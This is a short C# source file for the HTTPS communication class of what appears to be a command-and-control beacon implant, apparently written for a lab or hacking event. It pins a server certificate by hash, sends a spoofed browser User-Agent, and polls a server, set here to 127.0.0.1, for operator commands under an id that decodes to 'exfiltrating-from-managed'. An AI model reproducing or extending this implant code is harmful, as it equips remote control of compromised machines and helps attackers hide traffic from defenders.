using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Runtime;
using System.Text;
using System.Threading.Tasks;
using Newtonsoft.Json;

namespace Beacon_Managed
{
    internal class HttpsCommunicator
    {
        private HttpClient _httpClient;
        private string id = "ZXhmaWx0cmF0aW5nLWZyb20tbWFuYWdlZA";
        public HttpsCommunicator() {
            var handler = new HttpClientHandler();
            handler.ClientCertificateOptions = ClientCertificateOption.Manual;
            handler.ServerCertificateCustomValidationCallback =
                (httpRequestMessage, cert, cetChain, policyErrors) =>
                {
                    if(cert.GetCertHashString() == "7C825F3874C74D131D211385FC7157C93AA893DE")
                        return true;
                    return false;
                };

            _httpClient = new HttpClient(handler);
            _httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Hackout/2025 Firefox/1337.0");
            _httpClient.BaseAddress = new Uri("https://127.0.0.1/");
        }

        public string GetCommand()
        {
            Task<string> responseTask = _httpClient.GetStringAsync("order/"+id);
            responseTask.Wait();
            Dictionary<string, string> result = JsonConvert.DeserializeObject<Dictionary<string,string>>(responseTask.Result);
            return result["cmd"];
        }
    }
}
